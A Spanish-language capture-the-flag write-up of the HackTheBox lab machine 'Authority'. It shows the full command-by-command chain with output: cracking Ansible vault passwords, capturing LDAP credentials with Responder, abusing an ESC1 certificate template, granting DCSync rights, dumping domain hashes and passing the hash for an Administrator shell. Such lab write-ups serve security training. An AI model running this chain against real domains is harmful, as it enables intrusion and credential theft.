---
title: "Authority Write-Up - HackTheBox"
description: "Authority Write-Up - HackTheBox"
pubDatetime: 2023-10-01
tags:
  [
    "media",
    "htb",
    "AD",
    "ldap",
    "certificates",
    "responder",
    "cracking",
    "DCSync",
    "ansible",
  ]
---

# Reconocimiento

Comenzamos con un escaneo de puertos abiertos por TCP con nmap:

```bash
# Nmap 7.94 scan initiated Sat Sep 30 20:09:47 2023 as: /usr/bin/nmap -sS -p- --min-rate 3000 -n -Pn -vvv -oG openPorts 10.10.11.222
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.222 ()	Status: Up
Host: 10.10.11.222 ()	Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 3268/open/tcp//globalcatLDAP///, 5985/open/tcp//wsman///, 8443/open/tcp//https-alt///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49689/open/tcp/////, 49691/open/tcp/////, 49693/open/tcp/////, 49694/open/tcp/////, 49703/open/tcp/////, 49715/open/tcp/////, 49723/open/tcp/////, 57696/open/tcp/////
# Nmap done at Sat Sep 30 20:11:26 2023 -- 1 IP address (1 host up) scanned in 98.75 seconds
```

Ahora realizamos un escaneo más a fondo:

```bash
# Nmap 7.94 scan initiated Sat Sep 30 20:11:38 2023 as: nmap -sCV -p53,80,135,139,389,445,464,593,3268,5985,8443,9389,47001,49664,49665,49666,49667,49689,49691,49693,49694,49703,49715,49723,57696 -oN target 10.10.11.222
Nmap scan report for 10.10.11.222
Host is up (0.25s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-09-30T22:12:58+00:00; +4h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-30T22:12:58+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-09-28T15:43:47
|_Not valid after:  2025-09-30T03:22:11
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sat, 30 Sep 2023 22:11:58 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sat, 30 Sep 2023 22:11:58 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sat, 30 Sep 2023 22:12:04 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
57696/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=9/30%Time=651864EE%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sat,\x2030\x20Se
SF:p\x202023\x2022:11:58\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Sa
SF:t,\x2030\x20Sep\x202023\x2022:11:58\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sat,\
SF:x2030\x20Sep\x202023\x2022:11:58\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Sat,\x2030\x20Sep\x202023\x2022:12
SF::04\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time:
|   date: 2023-09-30T22:12:50
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 30 20:12:58 2023 -- 1 IP address (1 host up) scanned in 80.00 seconds
```

Tenemos muchos puertos abiertos, así que comenzamos por buscar recursos compartidos por SMB.

## SMB

Existe un recurso compartido del que podemos extraer credenciales encriptadas para distintos vaults de ansible.

```bash
❯ smbclient //10.10.11.222/Development/ -N
get Try "help" to get a list of possible commands.
smb: \> get Automation\Ansible\PWM\defaults\main.yml
getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as Automation\Ansible\PWM\defaults\main.yml (3,8 KiloBytes/sec) (average 3,8 KiloBytes/sec)
```

![](@assets/HackTheBox/Authority/vault.png)

Las convertimos a un formato crackeable

```bash
❯ cat hash1.txt
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438

❯ ansible2john hash1.txt hash2.txt hash3.txt > hashes
```

Lanzamos john para intentar crackearlas.

```bash
❯ john -w:/usr/share/seclists/rockyou.txt hashes
Warning: detected hash type "ansible", but the string is also recognized as "ansible-opencl"
Use the "--format=ansible-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Remaining 1 password hash
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (hash1.txt)
1g 0:00:00:53 DONE (2023-10-01 02:46) 0.01871g/s 744.9p/s 744.9c/s 744.9C/s 001982..ventana
Use the "--show" option to display all of the cracked passwords reliably
Session completed

❯ john --show hashes
hash1.txt:!@#$%^&*
hash2.txt:!@#$%^&*
hash3.txt:!@#$%^&*

3 password hashes cracked, 0 left
```

Al ver el contenido de los vaults obtenemos credenciales para el servicio que corre por el puerto 8443.

![](@assets/HackTheBox/Authority/user.png)

![](@assets/HackTheBox/Authority/pass.png)

## Servicio web

Por el puerto 8433 está hosteado un servicio **PWM**.

![](@assets/HackTheBox/Authority/pwm.png)

> PWM es una aplicación de código abierto de autogestión de contraseñas para directorios LDAP.

Nos podemos loguear con las credenciales anteriormente obtenidas.

![](@assets/HackTheBox/Authority/config.png)

Desde el panel de configuración podemos cambiar la dirección ldap contra la que se autentica para interceptar la petición con el responder.

![](@assets/HackTheBox/Authority/ldap.png)

![](@assets/HackTheBox/Authority/responder.png)

> En la imagen no recibo las credenciales pero porque ya las recibí antes y se quedó en la caché del responder.

Y obtenemos credenciales en texto claro para el usuario **svc_ldap**.

# Intrusión

Con **bloodhound-python** obtenemos información del directorio activo.

```bash
bloodhound-python --dns-tcp -ns 10.10.11.222 -u 'svc_ldap' -p '...' -d authority.htb -c all
```

![](@assets/HackTheBox/Authority/bloodhound.png)

Vemos que tenemos acceso a **authority.htb** con el usuario svc_ldap, así que uso evil-winrm para conectarme a la máquina.

![](@assets/HackTheBox/Authority/svc_ldap.png)

# Escalada de privilegios

Usando `certipy` en busca de plantillas de certificados vulnerables encuentra una vulnerabilidad.

```bash
❯ certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20230930234255_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230930234255_Certipy.txt'
[*] Saved JSON output to '20230930234255_Certipy.json'
```

Una plantilla llamada **CorpVPN**, vulnerable a ESC1.

```txt
 [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

Para explotarlo añado un nuevo equipo al dominio con **addcomputer.py** de impacket:

```bash
❯ addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'ZIOX' -computer-pass 'Password123!'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account ZIOX$ with password Password123!.
```

Y solicito un certificado con la plantilla vulnerable y el usuario al que queremos suplantar con el SAN (Administrator):

```bash
❯ certipy req -username ZIOX$ -password 'Password123!' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

Pero al intentar autenticarme con el certificado para obtener un TGT y obtener acceso como `Administrator` recibimos el siguiente error:

```bash
❯ certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222
Certipy v4.8.1 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.authority.htb'
> 1
[*] Using principal: authority$@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Este error simplemente significa que el KDC no admite autenticación via Kerberos.

Para bypassear esto utilizaré [PassTheCert](https://github.com/AlmondOffSec/PassTheCert):

```bash
❯ certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
❯ certipy cert -pfx administrator_authority.pfx -nocert -out user.key
```

Desde aquí hay diferentes maneras de obtener acceso como Administrator, recomiendo leer las opciones que se plantean en el repositorio de Github. Yo voy a elevar los privilegios del usuario **svc_ldap** para poder llevar a cabo un ataque DCSYNC:

```bash
❯ python passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target 'svc_ldap' -elevate
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Granted user 'svc_ldap' DCSYNC rights!
```

Ahora podemos obtener el hash NTLMv2 de cualquier usuario utilizando **secretsdump.py**:

```bash
❯ secretsdump.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!@10.10.11.222'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:5c54981ecf007f158584ad91d6a6aa55:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:0a5d5125f8f657366d2d982ffb68a645dae819715e4915d4d2bc23b041acb6d6
AUTHORITY$:aes128-cts-hmac-sha1-96:ab47daa967bbe7e83232c4d883916919
AUTHORITY$:des-cbc-md5:07616b38d6a1c7b3
[*] Cleaning up...
```

Accedemos mediante WinRM:

```bash
❯ evil-winrm  -i 10.10.11.222 -u Administrator -H 6961f422924da90a6928197429eea4ed

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

La última flag se encuentra en el escritorio de este.
